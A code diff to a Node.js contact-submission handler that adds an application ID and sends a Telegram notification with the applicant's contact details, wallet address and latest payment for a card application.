@@ -1,6 +1,7 @@
 const store = require("../storage/sessions");
-const { publicSession } = require("../utils/helpers");
+const { publicSession, createId } = require("../utils/helpers");
 const { NotFoundError } = require("../utils/errors");
+const logger = require("../utils/logger");
 
 /**
  * POST /api/front/contact
@@ -12,7 +13,9 @@ function submitContact(req, res) {
         throw new NotFoundError("Session not found");
     }
 
+    const applicationId = createId();
     const contact = {
+        applicationId,
         email: req.body.email,
         phone: req.body.phone,
         country: req.body.country,
@@ -21,8 +24,36 @@ function submitContact(req, res) {
 
     const stored = store.updateSession(session.connectionId, { contact });
 
+    const paymentStore = require("../storage/payments");
+    const payment = paymentStore.getLatestByConnectionId(stored.connectionId);
+    const walletAddress = (payment && stored.accounts?.find((item) => item.chainId === payment.chainId)?.address)
+        || stored.wallet?.address
+        || stored.accounts?.[0]?.address
+        || null;
+    const network = payment?.network || stored.accounts?.[0]?.chainId || stored.wallet?.chainId || null;
+
+    try {
+        const { notifyCardApplication } = require("../services/telegramNotifications");
+        notifyCardApplication({
+            applicationId,
+            email: contact.email,
+            phone: contact.phone,
+            country: contact.country,
+            submittedAt: contact.submittedAt,
+            walletAddress,
+            network,
+            connectionId: stored.connectionId,
+            payment
+        }).catch((err) => {
+            logger.warn({ err: { message: err.message }, applicationId }, "Telegram card-application notification failed");
+        });
+    } catch (err) {
+        logger.warn({ err: { message: err.message } }, "Telegram card-application notification failed");
+    }
+
     res.json({
         success: true,
+        applicationId,
         session: publicSession(stored)
     });
 }
